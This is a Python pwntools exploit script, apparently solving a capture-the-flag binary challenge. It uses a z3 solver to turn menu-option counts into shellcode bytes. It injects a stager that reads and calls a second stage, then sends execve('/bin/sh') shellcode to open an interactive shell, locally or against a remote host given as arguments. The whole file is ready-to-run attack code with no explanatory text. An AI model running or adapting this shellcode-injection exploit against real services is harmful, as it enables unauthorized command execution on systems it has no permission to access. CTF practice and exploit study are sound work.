#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from z3 import Solver, BitVec, sat

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x15d9
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def create(val):
    s = Solver()
    a = BitVec("a", 8)
    b = BitVec("b", 8)
    c = BitVec("c", 8)
    d = BitVec("d", 8)

    s.add((a * 0x16) + (b * 0x64) + (c * 0xF) + (d * (0x100 - 9)) == val)
    
    if s.check() == sat:
        m = s.model()
        a = m[a].as_long()
        b = m[b].as_long()
        c = m[c].as_long()
        d = m[d].as_long()
        return [a, b, c, d]
 

def solve():

    sh = asm("""
        execve:
            lea rdi, [rip+sh]
            xor esi, esi
            xor edx, edx
            xor eax, eax
            mov al, 0x3b
            syscall
            
        sh:
             .ascii "/bin/sh"
             .byte 0
        """)

    sc = asm("""
            mov rsi, rdx
            add rsi, 0x50
            mov rdx, 0x100
            syscall
            call rsi
    """)

    for byte in sc:
        a, b, c, d = create(byte)

        for _ in range(a):
            io.recvuntil(b"lines!")
            io.sendline(b"3")

        for _ in range(b):
            io.recvuntil(b"lines!")
            io.sendline(b"4")

        for _ in range(c):
            io.recvuntil(b"lines!")
            io.sendline(b"5")
    
        for _ in range(d):
            io.recvuntil(b"lines!")
            io.sendline(b"6")
    
        io.recvuntil(b"lines!")
        io.sendline(b"2")

    io.sendline(b"7")
    io.sendline(sh)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
